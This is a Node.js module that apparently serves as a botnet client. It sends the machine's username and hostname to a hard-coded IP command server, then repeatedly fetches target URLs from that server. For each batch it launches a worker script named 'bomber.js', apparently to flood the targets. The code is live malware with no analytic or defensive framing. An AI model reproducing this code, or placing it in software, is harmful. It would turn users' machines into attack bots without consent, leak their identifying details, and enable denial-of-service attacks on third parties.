const os = require('os');
const { Worker } =      require('worker_threads');
const fetch = require('isomorphic-fetch');

const RANDOM_INTERVAL = Math.floor(Math.random() * 60000) + 30000;

module.exports = async () => {
    await fetch('http://212.111.203.181/api/v1/bots', {
        method  : 'POST',
        headers : {
            'Content-Type' : 'application/json'
        },
        body : JSON.stringify({ data : {
            hostId : `${os.userInfo().username}-${os.hostname()}`
        } })
    });

    let worker;


    setInterval(async () => {
        try {
            const response = await fetch('http://212.111.203.181/api/v1/targets');
            const { data : { urls } } = await response.json();

            if (worker) await worker.terminate();

            if (urls.length > 0) {
                // eslint-disable-next-line require-atomic-updates
                worker = new Worker(
                    `${__dirname}/bomber.js`,
                    { workerData: { urls } }
                );
            }
        } catch (err) {
            console.log(err);
        }
    }, RANDOM_INTERVAL);
};

